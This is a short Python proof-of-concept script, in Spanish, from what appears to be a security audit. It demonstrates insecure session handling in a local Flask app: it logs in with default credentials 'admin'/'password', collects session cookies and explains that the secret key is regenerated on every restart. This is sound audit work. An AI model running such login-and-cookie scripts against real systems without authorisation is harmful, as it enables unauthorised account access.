# Exploit Gestión Insegura de Sesiones
# Auditor: DAVID H. CUEVAS SALGADO
# Vulnerabilidad: Session Management
# Severidad: MEDIA (CVSS 5.3)

import requests
import time

TARGET = 'http://localhost:5000'

print("="*60)
print("EXPLOIT: Gestión Insegura de Sesiones")
print("="*60)

# Demostración 1: Invalidación de sesiones al reiniciar
print("\n[TEST 1] Invalidación de sesiones al reiniciar aplicación")
print("-"*60)

session = requests.Session()
login_data = {"username": "admin", "password": "password"}
response = session.post(f'{TARGET}/login', data=login_data)

if 'session' in session.cookies:
    session_cookie_before = session.cookies['session']
    print(f"[+] Login exitoso")
    print(f"[+] Session cookie: {session_cookie_before[:30]}...")
    
    # Verificar acceso al dashboard
    dashboard = session.get(f'{TARGET}/dashboard')
    if dashboard.status_code == 200:
        print(f"[+] Acceso al dashboard: EXITOSO")
    
    print(f"\n[!] AHORA: Reinicia la aplicación con 'docker-compose restart'")
    print(f"[!] RESULTADO ESPERADO: La sesión se invalidará")
    print(f"[!] CAUSA: app.secret_key = os.urandom(24) genera nueva key en cada inicio")

# Demostración 2: Predictibilidad
print("\n[TEST 2] Análisis de predictibilidad de session tokens")
print("-"*60)

cookies = []
for i in range(5):
    s = requests.Session()
    s.post(f'{TARGET}/login', data=login_data)
    if 'session' in s.cookies:
        cookies.append(s.cookies['session'])

print(f"[+] Generadas 5 sesiones:")
for i, cookie in enumerate(cookies, 1):
    print(f"    Sesión {i}: {cookie[:40]}...")

print("\n[!] ANÁLISIS:")
print("    - Todas usan la misma secret_key (en esta ejecución)")
print("    - Al reiniciar, nueva secret_key → sesiones antiguas inválidas")
print("    - No hay persistencia de secret_key")

print("\n" + "="*60)
print("[!] VULNERABILIDAD CONFIRMADA: Gestión Insegura de Sesiones")
print("[!] IMPACTO: Invalidación masiva de sesiones al reiniciar")
print("="*60)
